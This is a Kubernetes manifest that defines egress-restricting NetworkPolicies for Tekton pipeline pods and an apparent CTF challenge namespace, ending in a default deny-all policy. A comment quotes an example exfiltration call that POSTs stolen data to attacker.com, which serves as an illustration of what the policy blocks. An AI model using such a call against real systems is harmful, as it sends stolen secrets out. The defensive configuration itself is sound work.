apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: tekton-pipelines-egress-restriction
  namespace: tekton-pipelines
  annotations:
    description: >-
      Restricts egress traffic from Tekton pipeline pods to prevent
      data exfiltration attacks. Only allows communication with internal
      cluster services and DNS.
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/managed-by: tekton-pipelines
  policyTypes:
  - Egress
  egress:
  # Allow DNS resolution
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - port: 53
      protocol: UDP
    - port: 53
      protocol: TCP

  # Allow communication with Kubernetes API server
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          component: apiserver
    ports:
    - port: 443
      protocol: TCP

  # Allow communication with Gitea (internal Git server)
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: gitea
    ports:
    - port: 3000
      protocol: TCP
    - port: 22
      protocol: TCP

  # Allow communication within same namespace
  - to:
    - podSelector: {}

  # IMPORTANT: Block all other egress traffic
  # This prevents exfiltration to attacker.com or other external servers
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: ctf-challenge-egress-restriction
  namespace: ctf-challenge
  annotations:
    description: >-
      Restricts egress traffic from CTF challenge pipelines.
      This is the PRIMARY defense against the Tekton attack where
      malicious code tries to exfiltrate stolen secrets via HTTP POST.
spec:
  podSelector: {}  # Apply to all pods in ctf-challenge namespace
  policyTypes:
  - Egress
  egress:
  # Allow DNS resolution
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
    ports:
    - port: 53
      protocol: UDP
    - port: 53
      protocol: TCP

  # Allow communication with Kubernetes API server (read-only operations)
  # Note: RBAC should prevent write operations even if network allows it
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          component: apiserver
    ports:
    - port: 443
      protocol: TCP

  # Allow communication with internal Gitea
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: gitea
    ports:
    - port: 3000
      protocol: TCP
    - port: 22
      protocol: TCP

  # Allow communication within same namespace
  - to:
    - podSelector: {}

  # CRITICAL: All other egress is BLOCKED
  # This prevents: http.Post("http://attacker.com/loot", stolen_data)
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all-egress
  namespace: ctf-challenge
  annotations:
    description: >-
      Default deny policy as a safety net. If the above policy is
      misconfigured, this ensures no traffic leaks out.
spec:
  podSelector: {}
  policyTypes:
  - Egress
  # No egress rules = deny all egress
